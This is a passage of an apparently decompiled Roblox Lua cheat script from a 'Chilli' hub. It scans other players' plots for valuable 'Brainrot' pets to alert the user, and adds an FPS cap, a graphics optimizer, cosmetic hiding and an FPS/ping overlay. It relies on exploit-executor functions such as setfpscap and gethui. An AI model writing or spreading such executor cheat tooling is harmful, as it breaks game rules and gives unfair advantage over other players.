		frame6.AnchorPoint = Vector2.new(1, 0)
		frame6.BackgroundTransparency = 1
		frame6.Position = UDim2.new(1, -13, 0, 74)
		frame6.Size = UDim2.fromOffset(174, 28)
		frame6.ZIndex = 183
		frame6.Parent = frame3
		local uiListLayout = Instance.new("UIListLayout")
		uiListLayout.FillDirection = Enum.FillDirection.Horizontal
		uiListLayout.HorizontalAlignment = Enum.HorizontalAlignment.Right
		uiListLayout.Padding = UDim.new(0, 3)
		uiListLayout.SortOrder = Enum.SortOrder.LayoutOrder
		uiListLayout.VerticalAlignment = Enum.VerticalAlignment.Center
		uiListLayout.Parent = frame6
		local v26 = ipairs
		local traitImages = arg.TraitImages or {}

		for k, traitImage in v26(traitImages) do
			if not (k > 6) then
				local frame7 = Instance.new("Frame")
				frame7.Name = "TraitBadge"
				frame7.BackgroundColor3 = secretZebra.Background:Lerp(Color3.new(1, 1, 1), 0.16)
				frame7.BackgroundTransparency = 0.12
				frame7.BorderSizePixel = 0
				frame7.LayoutOrder = k
				frame7.Size = UDim2.fromOffset(26, 26)
				frame7.ZIndex = 183
				frame7.Parent = frame6
				local uiCorner5 = Instance.new("UICorner")
				uiCorner5.CornerRadius = UDim.new(0, 7)
				uiCorner5.Parent = frame7
				local uiStroke6 = Instance.new("UIStroke")
				uiStroke6.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
				uiStroke6.Color = secretZebra.Colors.Keypoints[1].Value
				uiStroke6.Thickness = 1
				uiStroke6.Transparency = 0.35
				uiStroke6.Parent = frame7
				local imageLabel = Instance.new("ImageLabel")
				imageLabel.BackgroundTransparency = 1
				imageLabel.Image = traitImage
				imageLabel.Position = UDim2.fromOffset(2, 2)
				imageLabel.Size = UDim2.fromOffset(22, 22)
				imageLabel.ZIndex = 184
				imageLabel.Parent = frame7
				continue
			end

			break
		end

		local frame7 = Instance.new("Frame")
		frame7.Name = "ShineClip"
		frame7.BackgroundTransparency = 1
		frame7.BorderSizePixel = 0
		frame7.ClipsDescendants = true
		frame7.Size = UDim2.fromScale(1, 1)
		frame7.ZIndex = 182
		frame7.Parent = frame3
		local uiCorner5 = Instance.new("UICorner")
		uiCorner5.CornerRadius = UDim.new(0, 17)
		uiCorner5.Parent = frame7
		local frame8 = Instance.new("Frame")
		frame8.Name = "Shine"
		frame8.BackgroundColor3 = Color3.new(1, 1, 1)
		frame8.BackgroundTransparency = 0.78
		frame8.BorderSizePixel = 0
		frame8.Position = UDim2.fromScale(-0.25, 0)
		frame8.Rotation = 18
		frame8.Size = UDim2.fromScale(0.13, 1.35)
		frame8.ZIndex = 182
		frame8.Parent = frame7
		local uiGradient6 = Instance.new("UIGradient")
		local numberSequence = NumberSequence.new
		local tbl17 = {}
		local v27 = NumberSequenceKeypoint.new(0, 1)
		local v28 = NumberSequenceKeypoint.new(0.5, 0)
		local new3 = NumberSequenceKeypoint.new
		tbl17[1] = v27
		tbl17[2] = v28

		do
			local values = table.pack(new3(1, 1))
			table.move(values, 1, values.n, 3, tbl17)
		end

		uiGradient6.Transparency = numberSequence(tbl17)
		uiGradient6.Parent = frame8
		TweenService:Create(uiScale, TweenInfo.new(0.42, Enum.EasingStyle.Back, Enum.EasingDirection.Out), { Scale = v21 }):Play()
		TweenService:Create(frame8, TweenInfo.new(1.25, Enum.EasingStyle.Quad, Enum.EasingDirection.InOut), { Position = UDim2.fromScale(1.18, -0.12) }):Play()
		fn36()
		local n10 = tonumber(arg2) or 6

		pcall(function()
			game:GetService("Debris"):AddItem(frame, n10 + 1.5)
		end)

		local flag7 = false

		local function fn44()
			if flag7 then
				return
			end
			flag7 = true

			for i_ = #tbl15, 1, -1 do
				pcall(tbl15[i_])
				tbl15[i_] = nil
			end

			pcall(function()
				tween:Cancel()
			end)

			fn40(frame)

			if frame.Parent then
				pcall(function()
					frame:Destroy()
				end)
			end
		end

		task.delay(n10, function()
			local v29 = flag7
			local flag8

			if flag7 then
				flag8 = v29
			else
				flag8 = not frame3.Parent
			end

			if flag8 then
				fn44()
				return
			end

			pcall(function()
				tween:Cancel()
				local tbl18 = { Scale = v21 * 0.78 }
				TweenService:Create(uiScale, TweenInfo.new(0.3, Enum.EasingStyle.Back, Enum.EasingDirection.In), tbl18):Play()

				for _, descendant in ipairs(frame3:GetDescendants()) do
					if descendant:IsA("TextLabel") then
						TweenService:Create(descendant, TweenInfo.new(0.28), { TextTransparency = 1, BackgroundTransparency = 1 }):Play()
					elseif descendant:IsA("UIStroke") then
						TweenService:Create(descendant, TweenInfo.new(0.28), { Transparency = 1 }):Play()
					elseif descendant:IsA("ImageLabel") then
						TweenService:Create(descendant, TweenInfo.new(0.28), { ImageTransparency = 1 }):Play()
					elseif descendant:IsA("ViewportFrame") then
						TweenService:Create(descendant, TweenInfo.new(0.28), { BackgroundTransparency = 1, ImageTransparency = 1 }):Play()
					elseif descendant:IsA("Frame") then
						TweenService:Create(descendant, TweenInfo.new(0.28), { BackgroundTransparency = 1 }):Play()
					end
				end

				TweenService:Create(frame3, TweenInfo.new(0.28), { BackgroundTransparency = 1 }):Play()
			end)

			task.delay(0.34, fn44)
		end)

		task.delay(n10 + 1, fn44)
		return true
	end

	local function fn43(arg)
		local match, v20 = tostring(arg or ""):gsub("[%$,/s]", ""):gsub("%s+", ""):match("^([%d%.]+)([KkMmBbTt]?)$")
		local num = tonumber(match)
		if not num then
			return nil
		end
		return num * (({ K = 1000, M = 1000000, B = 1e9, T = 1e12 })[string.upper(v20)] or 1)
	end

	local function fn44(arg)
		if arg >= 1e12 then
			return string.format("$%.2fT/s", arg / 1e12)
		end

		if arg >= 1e9 then
			return string.format("$%.2fB/s", arg / 1e9)
		end

		if arg >= 1000000 then
			return string.format("$%.2fM/s", arg / 1000000)
		end

		if arg >= 1000 then
			return string.format("$%.1fK/s", arg / 1000)
		end
		return string.format("$%d/s", math.floor(arg))
	end

	local function fn45(arg)
		return arg:FindFirstChild("RootPart") or arg.PrimaryPart or arg:FindFirstChildWhichIsA("BasePart")
	end

	local function fn46()
		local tbl14 = {}
		local debris = Workspace:FindFirstChild("Debris")
		if not debris then
			return tbl14
		end

		for _, child in ipairs(debris:GetChildren()) do
			if child:IsA("BasePart") and child.Name == "FastOverheadTemplate" then
				local animalOverhead = child:FindFirstChild("AnimalOverhead")
				local displayName = animalOverhead and animalOverhead:FindFirstChild("DisplayName")
				local generation = animalOverhead and animalOverhead:FindFirstChild("Generation")

				if displayName and displayName:IsA("TextLabel") and generation and generation:IsA("TextLabel") then
					local str4 = tostring(displayName.Text or "")
					tbl14[str4] = tbl14[str4] or {}
					tbl14[str4][#tbl14[str4] + 1] = { Position = child.Position, Value = fn43(generation.Text), Overhead = animalOverhead }
				end
			end
		end

		return tbl14
	end

	local function fn47(arg, arg2, arg3)
		local v20, v21, v22 = ipairs(arg3[arg] or {})
		local n10 = 14
		local v23 = nil

		for _, v24 in v20, v21, v22 do
			local magnitude = (v24.Position - arg2).Magnitude

			if magnitude < n10 then
				n10 = magnitude
				v23 = v24
			end
		end

		return v23
	end

	local function fn48(arg, arg2)
		local v20 = tbl10[arg.Name]
		local n10 = type(v20) == "table" and tonumber(v20.Generation) or 0
		if n10 <= 0 then
			arg2 = arg2 and arg2.Value
			return arg2 or 0
		end
		local attribute = arg:GetAttribute("Mutation") or arg:GetAttribute("__mutation")
		local mutation = arg2 and arg2.Overhead:FindFirstChild("Mutation")

		if mutation and mutation:IsA("TextLabel") and mutation.Visible and mutation.Text ~= "" then
			attribute = mutation.Text
		end

		attribute = attribute and tbl11[tostring(attribute)]
		local n11 = 1

		if type(attribute) == "table" then
			n11 = 1 + (tonumber(attribute.Modifier) or 0)
		end

		local flag7 = false

		for _, child in ipairs(arg:GetChildren()) do
			local match = child.Name:match("^_Trait%.(.+)$")
			local v21 = match and (tbl12[match] or tbl12[match:gsub("_", " ")])

			if type(v21) == "table" then
				if match == "Sleepy" or v21.Name == "Sleepy" then
					flag7 = true
				else
					n11 += tonumber(v21.MultiplierModifier) or 0
				end
			end
		end

		local v21 = math.round(n10 * n11 * (flag7 and 0.5 or 1))
		arg2 = arg2 and arg2.Value
		if arg2 and arg2 > 0 then
			return arg2
		end
		return v21
	end

	local function fn49()
		local tbl14 = {}
		local plots = Workspace:FindFirstChild("Plots")
		if not plots then
			return tbl14, 0
		end
		local v20 = fn46()
		local n10 = 0

		for _, child in ipairs(plots:GetChildren()) do
			for _, child2 in ipairs(child:GetChildren()) do
				if child2:IsA("Model") and tbl10[child2.Name] then
					local v21 = fn45(child2)

					if v21 then
						local overhead = fn47(child2.Name, v21.Position, v20)
						local v22 = fn48(child2, overhead)

						if v22 > 0 then
							local v23 = tbl10[child2.Name]
							overhead = overhead and overhead.Overhead
							local mutation = overhead and overhead:FindFirstChild("Mutation")
							local visible = mutation and mutation:IsA("TextLabel") and mutation.Visible

							if visible then
								visible = tostring(mutation.Text or "") ~= ""
							end

							if visible then
								visible = string.lower(tostring(mutation.Text or "")) ~= "normal"
							end

							local text = nil
							local flag7 = false
							local textColor3 = nil
							local flag8 = false
							local fontFace = nil
							local textStrokeColor3 = nil
							local textStrokeTransparency = nil
							local color = nil
							local rotation = nil
							local transparency = nil

							if visible then
								text = mutation.Text
								textColor3 = mutation.TextColor3
								flag8 = mutation.RichText
								fontFace = mutation.FontFace
								textStrokeColor3 = mutation.TextStrokeColor3
								textStrokeTransparency = mutation.TextStrokeTransparency
								local uiGradient = mutation:FindFirstChildWhichIsA("UIGradient")
								flag7 = true
								color = nil
								rotation = nil
								transparency = nil

								if uiGradient then
									color = uiGradient.Color
									rotation = uiGradient.Rotation
									transparency = uiGradient.Transparency
								end
							end

							local tbl15 = {}
							local traits = overhead and overhead:FindFirstChild("Traits")

							if traits then
								for _, child3 in ipairs(traits:GetChildren()) do
									if child3:IsA("ImageLabel") and child3.Visible and child3.Image ~= "" and #tbl15 < 6 then
										tbl15[#tbl15 + 1] = child3.Image
									end
								end
							end

							local rarity = type(v23) == "table" and (v23.Rarity or v23.Tier or v23.Rank) or nil

							tbl14[#tbl14 + 1] = {
								Model = child2,
								Name = child2.Name,
								Value = v22,
								ValueText = fn44(v22),
								Rarity = rarity and tostring(rarity) or "",
								MutationVisible = flag7,
								MutationText = text and tostring(text) or nil,
								MutationColor = textColor3,
								MutationRichText = flag8,
								MutationFontFace = fontFace,
								MutationStrokeColor = textStrokeColor3,
								MutationStrokeTransparency = textStrokeTransparency,
								MutationGradientColor = color,
								MutationGradientRotation = rotation,
								MutationGradientTransparency = transparency,
								TraitImages = tbl15,
							}

							if n10 < v22 then
								n10 = v22
							end
						end
					end
				end
			end
		end

		return tbl14, n10
	end

	local function fn50(arg, arg2)
		fn42(arg, 7, arg2 or "Secret Zebra")
	end

	local function fn51()
		table.clear(obj2)
		local v20, v21 = fn49()

		for _, v22 in ipairs(v20) do
			obj2[v22.Model] = { FirstSeen = -math.huge, Value = v22.Value }
		end

		n8 = v21
	end

	local function fn52()
		local now = os.clock()
		local v20, v21 = fn49()
		local tbl14 = {}
		local n10 = 0

		for _, v22 in ipairs(v20) do
			local v23 = obj2[v22.Model]
			local isNew = v23 == nil
			local flag7 = v23 and now - v23.FirstSeen <= n6 and v22.Value > v23.Value
			v22.IsNew = isNew
			v22.IsLateValue = flag7 == true

			if isNew then
				obj2[v22.Model] = { FirstSeen = now, Value = v22.Value }
			elseif v23.Value < v22.Value then
				v23.Value = v22.Value
			end

			if not isNew and not flag7 and v22.Value > n10 then
				n10 = v22.Value
			end
		end

		local v22 = nil

		for _, v23 in ipairs(v20) do
			if (v23.IsNew or v23.IsLateValue) and v23.Value >= n7 then
				tbl14[#tbl14 + 1] = v23

				if v23.Value > n10 and (not v22 or v23.Value > v22.Value) then
					v22 = v23
				end
			end
		end

		n8 = v21

		if flag6 and v22 then
			fn50(v22)
		elseif not flag6 then
			table.sort(tbl14, function(arg, arg2)
				return arg.Value > arg2.Value
			end)

			for _, v23 in ipairs(tbl14) do
				fn50(v23)
			end
		end
	end

	local function fn53()
		flag5 = false

		if connection then
			connection:Disconnect()
			connection = nil
		end
	end

	local function fn54()
		fn53()
		fn51()
		flag5 = true
		n9 = os.clock() + n5

		connection = RunService.Heartbeat:Connect(function()
			if not flag5 or os.clock() < n9 then
				return
			end
			n9 = os.clock() + n5
			pcall(fn52)
		end)
	end

	local function fn55()
		fn53()

		for i_ = #tbl9, 1, -1 do
			local v20 = tbl9[i_]

			if v20 and v20.Parent then
				v20:Destroy()
			end

			tbl9[i_] = nil
		end

		if v17 and v17.Parent then
			v17:Destroy()
		end

		v17 = nil
		v18 = nil
	end

	v15.Event:Connect(fn55)
	chilliBrainrotNotificationRuntim.Destroying:Connect(fn55)

	v10:CreateToggle({
		Name = "Brainrot Notifications",
		Default = false,
		Callback = function(arg)
			if arg then
				fn54()
			else
				fn53()
			end
		end,
	})
end

v10:CreateToggle({
	Name = "Only New Highest",
	Note = "Only notifies when the new Brainrot is worth more than every Brainrot already present.",
	Default = true,
	Callback = function(arg)
		flag6 = arg == true
	end,
})

do
	local tbl14 = {
		["K/s"] = { Min = 0, Max = 1000, Mult = 1000 },
		["M/s"] = { Min = 0, Max = 1000, Mult = 1000000 },
		["B/s"] = { Min = 1, Max = 1000, Mult = 1e9 },
		["T/s"] = { Min = 1, Max = 1000, Mult = 1e12 },
	}

	local v20 = nil
	local n10 = 1
	local str4 = "M/s"

	local function fn32(arg, arg2)
		if arg ~= nil then
			n10 = math.floor(tonumber(arg) or n10)
		end

		if arg2 ~= nil then
			str4 = tostring(arg2)
		elseif v20 and v20.GetUnit then
			local unit = v20:GetUnit()

			if unit and unit ~= "" then
				str4 = tostring(unit)
			end
		end

		n7 = n10 * (tbl14[str4] or tbl14["M/s"]).Mult
	end

	local function fn33(arg)
		str4 = tostring(arg)
		local ms = tbl14[str4] or tbl14["M/s"]

		if v20 and v20.SetRange then
			v20:SetRange(ms.Min, ms.Max)
			local min = v20:Get() or ms.Min
			local min2 = ms.Min
			local max = ms.Max
			local n11 = math.clamp(math.floor(min + 0.5), min2, max)

			if n11 ~= min then
				v20:Set(n11)
			else
				fn32(n11, str4)
			end
		else
			fn32(nil, str4)
		end
	end

	v20 = v10:CreateSlider({
		Name = "Notification Min Value",
		Note = "Ignores newly spawned Brainrots below this generation value.",
		Min = 0,
		Max = 1000,
		Default = 0,
		AllowDecimals = false,
		Increment = 1,
		Unit = {
			Default = "M/s",
			Selector = true,
			Options = { "K/s", "M/s", "B/s", "T/s" },
			ColorEnabled = true,
			Colors = { Number = Color3.fromRGB(255, 255, 255), Suffix = Color3.fromRGB(58, 255, 55) },
			Callback = function(arg)
				fn33(arg)
			end,
		},
		Quick = false,
		Callback = function(arg)
			fn32(arg, nil)
		end,
	})
end

v10:CreateInput({
	Name = "Notification Sound ID",
	Note = "Enter an audio asset ID, then press Apply Sound ID.",
	Placeholder = "rbxassetid://123456789",
	Default = "rbxassetid://110902246151945",
	MaxLength = 40,
	Callback = function(arg)
		fn30(arg)
	end,
})

v10:CreateButton({
	Name = "Apply Sound ID",
	ButtonText = "Apply",
	Callback = function()
		task.spawn(function()
			fn31()
		end)
	end,
})

local v20
v20 = Misc:CreateSection({ Name = "Performance", Expanded = true })
local flag7 = false

v20:CreateSlider({
	Name = "FPS Cap",
	Min = 30,
	Max = 1000,
	Default = 240,
	AllowDecimals = false,
	Increment = 1,
	Unit = " FPS",
	Quick = false,
	Callback = function(arg)
		local n10 = math.clamp(math.floor(tonumber(arg) or 240), 30, 1000)

		if type(setfpscap) == "function" then
			if pcall(setfpscap, n10) then
				flag7 = false
				return
			end
		end

		if not flag7 then
			flag7 = true
			v.Notify("FPS Cap Unavailable", "This environment does not support setfpscap.", 5)
		end
	end,
})

local flag8, n10, thread

do
	local n11 = 300
	flag8 = false
	n10 = 0
	thread = nil
	local tbl14 = {}
	local tbl15 = {}
	local obj3 = setmetatable({}, { __mode = "k" })
	local chilliOptimizerRuntime = CoreGui:FindFirstChild("__ChilliOptimizerRuntime")

	if chilliOptimizerRuntime then
		local cleanup = chilliOptimizerRuntime:FindFirstChild("Cleanup")

		if cleanup and cleanup:IsA("BindableEvent") then
			pcall(function()
				cleanup:Fire()
			end)
		end

		pcall(function()
			chilliOptimizerRuntime:Destroy()
		end)
	end

	local folder = Instance.new("Folder")
	folder.Name = "__ChilliOptimizerRuntime"
	folder.Archivable = false
	folder.Parent = CoreGui
	local bindableEvent = Instance.new("BindableEvent")
	bindableEvent.Name = "Cleanup"
	bindableEvent.Parent = folder

	local function fn32(arg, arg2, arg3)
		local ok, result = pcall(arg)
		if not ok then
			return
		end
		tbl15[#tbl15 + 1] = { Setter = arg2, Value = result }
		pcall(arg2, arg3)
	end

	local function fn33(arg, arg2, arg3)
		local tbl16 = obj3[arg]

		if not tbl16 then
			tbl16 = {}
			obj3[arg] = tbl16
		end

		if tbl16[arg2] == nil then
			local ok, result = pcall(function()
				return arg[arg2]
			end)

			if not ok then
				return
			end
			tbl16[arg2] = { Value = result }
		end

		pcall(function()
			arg[arg2] = arg3
		end)
	end

	local function fn34(arg)
		if not flag8 or not arg.Parent then
			return
		end

		if obj[arg] then
			return
		end

		if arg:IsA("ParticleEmitter") then
			fn33(arg, "Enabled", false)
			fn33(arg, "Rate", 0)
		elseif arg:IsA("Trail") or arg:IsA("Beam") then
			fn33(arg, "Enabled", false)
		elseif arg:IsA("PointLight") or arg:IsA("SpotLight") or arg:IsA("SurfaceLight") then
			fn33(arg, "Enabled", false)
			fn33(arg, "Brightness", 0)
		elseif arg:IsA("Fire") or arg:IsA("Smoke") or arg:IsA("Sparkles") then
			fn33(arg, "Enabled", false)
		elseif arg:IsA("Explosion") then
			fn33(arg, "Visible", false)
		elseif arg:IsA("SpecialMesh") then
			fn33(arg, "TextureId", "")
		elseif arg:IsA("Decal") or arg:IsA("Texture") then
			if not (arg.Name == "face" and arg.Parent and arg.Parent.Name == "Head") then
				fn33(arg, "Transparency", 1)
			end
		elseif arg:IsA("BasePart") then
			fn33(arg, "CastShadow", false)
			fn33(arg, "Material", Enum.Material.Plastic)
			fn33(arg, "Reflectance", 0)
		elseif arg:IsA("PostEffect") then
			fn33(arg, "Enabled", false)
		elseif arg:IsA("Atmosphere") then
			fn33(arg, "Density", 0)
			fn33(arg, "Haze", 0)
			fn33(arg, "Glare", 0)
		end
	end

	local function fn35()
		for _, v21 in ipairs(tbl14) do
			if v21.Connected then
				v21:Disconnect()
			end
		end

		table.clear(tbl14)
	end

	local function fn36()
		local rendering = settings().Rendering
		local terrain = Workspace.Terrain

		fn32(function()
			return Workspace.StreamingEnabled
		end, function(streamingEnabled)
			Workspace.StreamingEnabled = streamingEnabled
		end, true)

		fn32(function()
			return Workspace.StreamingMinRadius
		end, function(streamingMinRadius)
			Workspace.StreamingMinRadius = streamingMinRadius
		end, 64)

		fn32(function()
			return Workspace.StreamingTargetRadius
		end, function(streamingTargetRadius)
			Workspace.StreamingTargetRadius = streamingTargetRadius
		end, 256)

		fn32(function()
			return Workspace.StreamingIntegrityMode
		end, function(streamingIntegrityMode)
			Workspace.StreamingIntegrityMode = streamingIntegrityMode
		end, Enum.StreamingIntegrityMode.MinimumRadiusPause)

		fn32(function()
			return rendering.QualityLevel
		end, function(qualityLevel)
			rendering.QualityLevel = qualityLevel
		end, Enum.QualityLevel.Level01)

		fn32(function()
			return rendering.MeshPartDetailLevel
		end, function(meshPartDetailLevel)
			rendering.MeshPartDetailLevel = meshPartDetailLevel
		end, Enum.MeshPartDetailLevel.Level01)

		fn32(function()
			return rendering.EditQualityLevel
		end, function(editQualityLevel)
			rendering.EditQualityLevel = editQualityLevel
		end, Enum.QualityLevel.Level01)

		fn32(function()
			return Lighting.GlobalShadows
		end, function(globalShadows)
			Lighting.GlobalShadows = globalShadows
		end, false)

		fn32(function()
			return Lighting.FogEnd
		end, function(fogEnd)
			Lighting.FogEnd = fogEnd
		end, 9e9)

		fn32(function()
			return Lighting.Technology
		end, function(technology)
			Lighting.Technology = technology
		end, Enum.Technology.Legacy)

		fn32(function()
			return Lighting.EnvironmentDiffuseScale
		end, function(environmentDiffuseScale)
			Lighting.EnvironmentDiffuseScale = environmentDiffuseScale
		end, 0)

		fn32(function()
			return Lighting.EnvironmentSpecularScale
		end, function(environmentSpecularScale)
			Lighting.EnvironmentSpecularScale = environmentSpecularScale
		end, 0)

		fn32(function()
			return terrain.Decoration
		end, function(decoration)
			terrain.Decoration = decoration
		end, false)

		fn32(function()
			return terrain.WaterWaveSize
		end, function(waterWaveSize)
			terrain.WaterWaveSize = waterWaveSize
		end, 0)

		fn32(function()
			return terrain.WaterWaveSpeed
		end, function(waterWaveSpeed)
			terrain.WaterWaveSpeed = waterWaveSpeed
		end, 0)

		fn32(function()
			return terrain.WaterReflectance
		end, function(waterReflectance)
			terrain.WaterReflectance = waterReflectance
		end, 0)

		fn32(function()
			return terrain.WaterTransparency
		end, function(waterTransparency)
			terrain.WaterTransparency = waterTransparency
		end, 1)
	end

	local function fn37(arg, arg2)
		local descendants = arg:GetDescendants()

		for i_, descendant in ipairs(descendants) do
			if not flag8 or n10 ~= arg2 then
				return false
			end
			fn34(descendant)

			if i_ % n11 == 0 then
				RunService.Heartbeat:Wait()
			end
		end

		return true
	end

	local function fn38()
		local n12 = 0

		for k, v21 in pairs(obj3) do
			if k.Parent then
				for k2, v22 in pairs(v21) do
					pcall(function()
						k[k2] = v22.Value
					end)
				end
			end

			obj3[k] = nil
			n12 += 1

			if n12 % n11 == 0 then
				RunService.Heartbeat:Wait()
			end
		end
	end

	local function fn39()
		if not flag8 then
			return
		end
		flag8 = false
		n10 += 1
		fn35()

		if thread then
			pcall(task.cancel, thread)
			thread = nil
		end

		fn38()

		for i_ = #tbl15, 1, -1 do
			local v21 = tbl15[i_]
			pcall(v21.Setter, v21.Value)
		end

		table.clear(tbl15)
	end

	local function fn40()
		if flag8 then
			return
		end
		flag8 = true
		n10 += 1
		local v21 = n10
		fn36()

		tbl14[#tbl14 + 1] = Workspace.DescendantAdded:Connect(function(descendant)
			if flag8 and n10 == v21 then
				task.defer(function()
					if flag8 and n10 == v21 then
						fn34(descendant)
					end
				end)
			end
		end)

		tbl14[#tbl14 + 1] = Lighting.DescendantAdded:Connect(function(descendant)
			if flag8 and n10 == v21 then
				task.defer(function()
					if flag8 and n10 == v21 then
						fn34(descendant)
					end
				end)
			end
		end)

		thread = task.spawn(function()
			if not fn37(Workspace, v21) then
				return
			end
			fn37(Lighting, v21)
		end)
	end

	bindableEvent.Event:Connect(fn39)
	folder.Destroying:Connect(fn39)

	v20:CreateToggle({
		Name = "Optimizer",
		Default = false,
		Callback = function(arg)
			if arg then
				fn40()
			else
				fn39()
			end
		end,
	})
end

do
	local flag9 = false
	local connection2 = nil
	local connection3 = nil
	local tbl14 = {}
	local tbl15 = {}

	local function fn32(arg)
		return arg:IsA("Accessory") or arg:IsA("Clothing") or arg:IsA("ShirtGraphic")
	end

	local function fn33(arg)
		if flag9 and arg.Parent and fn32(arg) then
			pcall(function()
				arg:Destroy()
			end)
		end
	end

	local function fn34(arg)
		if not flag9 or not arg then
			return
		end

		for _, descendant in ipairs(arg:GetDescendants()) do
			fn33(descendant)
		end
	end

	local function fn35(player)
		local v21 = tbl14[player]

		if v21 then
			v21:Disconnect()
			tbl14[player] = nil
		end

		local v22 = tbl15[player]

		if v22 then
			v22:Disconnect()
			tbl15[player] = nil
		end
	end

	local function fn36(arg, arg2)
		local v21 = tbl14[arg]

		if v21 then
			v21:Disconnect()
		end

		tbl14[arg] = arg2.DescendantAdded:Connect(function(descendant)
			if flag9 and fn32(descendant) then
				task.defer(fn33, descendant)
			end
		end)

		fn34(arg2)
	end

	local function fn37(player)
		fn35(player)

		tbl15[player] = player.CharacterAdded:Connect(function(character_)
			if flag9 then
				fn36(player, character_)
			end
		end)

		if player.Character then
			fn36(player, player.Character)
		end
	end

	local function fn38()
		flag9 = false

		if connection2 then
			connection2:Disconnect()
			connection2 = nil
		end

		if connection3 then
			connection3:Disconnect()
			connection3 = nil
		end

		for k in pairs(tbl15) do
			fn35(k)
		end

		for k in pairs(tbl14) do
			fn35(k)
		end
	end

	local function fn39()
		if flag9 then
			return
		end
		flag9 = true
		connection2 = Players.PlayerAdded:Connect(fn37)
		connection3 = Players.PlayerRemoving:Connect(fn35)

		for _, player in ipairs(Players:GetPlayers()) do
			fn37(player)
		end
	end

	fn2(fn38)

	v20:CreateToggle({
		Name = "Hide Player Cosmetics",
		Default = false,
		Callback = function(arg)
			if arg then
				fn39()
			else
				fn38()
			end
		end,
	})
end

local name
name = "ChilliFpsPingGui"
local n11
n11 = 132
local n12
n12 = 0.085
local n13
n13 = 0.2
local n14
n14 = 8
local fn32, fn33
local v21 = v2:CreateState({ Name = "FPS and Ping Position", Default = {} })

fn32 = function()
	local v22 = v21:Get()
	if type(v22) == "table" and type(v22.XOffset) == "number" and type(v22.YOffset) == "number" then
		return UDim2.new(tonumber(v22.XScale) or 0, v22.XOffset, tonumber(v22.YScale) or 0, v22.YOffset)
	end
	return UDim2.new(0, 16, 0, 16)
end

fn33 = function(arg)
	v21:Set({ XScale = arg.X.Scale, XOffset = arg.X.Offset, YScale = arg.Y.Scale, YOffset = arg.Y.Offset })
end

local color
color = Color3.fromRGB(58, 255, 55)

do
	local color2 = Color3.fromRGB(255, 214, 84)
	local color3 = Color3.fromRGB(255, 96, 96)
	local color4 = Color3.fromRGB(150, 150, 158)
	local flag9 = false
	local tbl14 = {}
	local screenGui = nil
	local frame = nil
	local uiScale = nil
	local v22 = nil
	local v23 = nil
	local n15 = 1
	local n16 = 0
	local n17 = 0
	local v24 = nil
	local v25 = nil
	local gothamBold = Enum.Font.GothamBold

	pcall(function()
		gothamBold = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.ExtraBold, Enum.FontStyle.Normal)
	end)

	local function fn34(arg)
		if typeof(gothamBold) == "Font" then
			arg.FontFace = gothamBold
		else
			arg.Font = Enum.Font.GothamBold
		end
	end

	local function fn35(arg)
		if arg >= 100 then
			return color
		end

		if arg >= 50 then
			return color2
		end
		return color3
	end

	local function fn36(arg)
		if arg <= 90 then
			return color
		end

		if arg <= 180 then
			return color2
		end
		return color3
	end

	local function fn37()
		if not uiScale then
			return
		end
		local currentCamera = Workspace.CurrentCamera
		currentCamera = currentCamera and currentCamera.ViewportSize or Vector2.new(1280, 720)

		if currentCamera.X < 1 then
			currentCamera = Vector2.new(1280, 720)
		end

		uiScale.Scale = math.clamp(currentCamera.X * n12 / n11, 0.7, 1.4) * n15
	end

	local function fn38()
		for _, v26 in ipairs(tbl14) do
			pcall(function()
				v26:Disconnect()
			end)
		end

		table.clear(tbl14)

		if screenGui then
			pcall(function()
				screenGui:Destroy()
			end)
		end

		screenGui = nil
		frame = nil
		uiScale = nil
		v22 = nil
		v23 = nil
		v24 = nil
		v25 = nil
		n16 = 0
	end

	local function createTextLabel(parent, arg, arg2, textXAlignment, textColor3)
		local textLabel = Instance.new("TextLabel")
		textLabel.BackgroundTransparency = 1
		textLabel.Position = UDim2.fromOffset(arg, 9)
		textLabel.Size = UDim2.fromOffset(arg2, 16)
		textLabel.Text = ""
		textLabel.TextColor3 = textColor3
		textLabel.TextScaled = true
		textLabel.TextXAlignment = textXAlignment
		fn34(textLabel)
		textLabel.Parent = parent
		return textLabel
	end

	local function fn39()
		fn38()
		local v26 = CoreGui

		if type(gethui) == "function" then
			local ok, result = pcall(gethui)
			ok = ok and typeof(result) == "Instance"
			local v27 = CoreGui

			if ok then
				v26 = result
			else
				v26 = v27
			end
		end

		local chilliFpsPingGui = v26:FindFirstChild("ChilliFpsPingGui")

		if chilliFpsPingGui then
			pcall(function()
				chilliFpsPingGui:Destroy()
			end)
		end

		screenGui = Instance.new("ScreenGui")
		screenGui.Name = name
		screenGui.DisplayOrder = 58
		screenGui.IgnoreGuiInset = true
		screenGui.ResetOnSpawn = false
		screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
		screenGui.Parent = v26
		frame = Instance.new("Frame")
		frame.Active = true
		frame.AnchorPoint = Vector2.new(0, 0)
		frame.BackgroundColor3 = Color3.fromRGB(24, 24, 28)
		frame.BackgroundTransparency = 0.28
		frame.BorderSizePixel = 0
		frame.Position = fn32()
		frame.Size = UDim2.fromOffset(132, 34)
		frame.Parent = screenGui
		Instance.new("UICorner", frame).CornerRadius = UDim.new(0, 12)
		local uiStroke = Instance.new("UIStroke")
		uiStroke.Color = Color3.fromRGB(255, 255, 255)
		uiStroke.Thickness = 1
		uiStroke.Transparency = 0.9
		uiStroke.Parent = frame
		uiScale = Instance.new("UIScale")
		uiScale.Parent = frame
		fn37()
		v22 = createTextLabel(frame, 12, 34, Enum.TextXAlignment.Left, color)
		createTextLabel(frame, 48, 22, Enum.TextXAlignment.Left, color4).Text = "FPS"
		local frame2 = Instance.new("Frame")
		frame2.AnchorPoint = Vector2.new(0.5, 0.5)
		frame2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
		frame2.BackgroundTransparency = 0.85
		frame2.BorderSizePixel = 0
		frame2.Position = UDim2.new(0, 74, 0.5, 0)
		frame2.Size = UDim2.fromOffset(1, 14)
		frame2.Parent = frame
		v23 = createTextLabel(frame, 82, 30, Enum.TextXAlignment.Left, color)
		createTextLabel(frame, 113, 14, Enum.TextXAlignment.Left, color4).Text = "ms"
		local currentCamera = Workspace.CurrentCamera

		if currentCamera then
			tbl14[#tbl14 + 1] = currentCamera:GetPropertyChangedSignal("ViewportSize"):Connect(fn37)
		end

		local flag10 = false
		local v27 = nil
		local vector2 = Vector2.new(0, 0)
		local position = nil

		tbl14[#tbl14 + 1] = frame.InputBegan:Connect(function(input)
			if flag10 or input.UserInputState ~= Enum.UserInputState.Begin then
				return
			end
